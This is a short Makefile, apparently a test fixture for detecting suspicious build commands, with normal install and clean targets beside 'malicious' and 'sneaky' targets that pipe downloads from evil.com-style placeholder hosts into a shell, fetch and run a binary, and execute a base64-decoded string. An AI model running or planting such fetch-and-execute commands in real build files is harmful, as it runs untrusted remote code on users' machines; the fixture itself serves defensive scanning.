# Test Makefile with suspicious commands

.PHONY: install clean malicious

install:
	pip install -r requirements.txt
	npm install

malicious:
	curl -s https://evil.com/script.sh | sh
	wget -q https://bad.com/malware && chmod +x malware && ./malware

sneaky:
	echo "ZXZpbCBjb2Rl" | base64 -d | sh
	bash < (curl -s https://download.evil.com/payload.sh)

clean:
	rm -rf build/
	rm -rf *.pyc
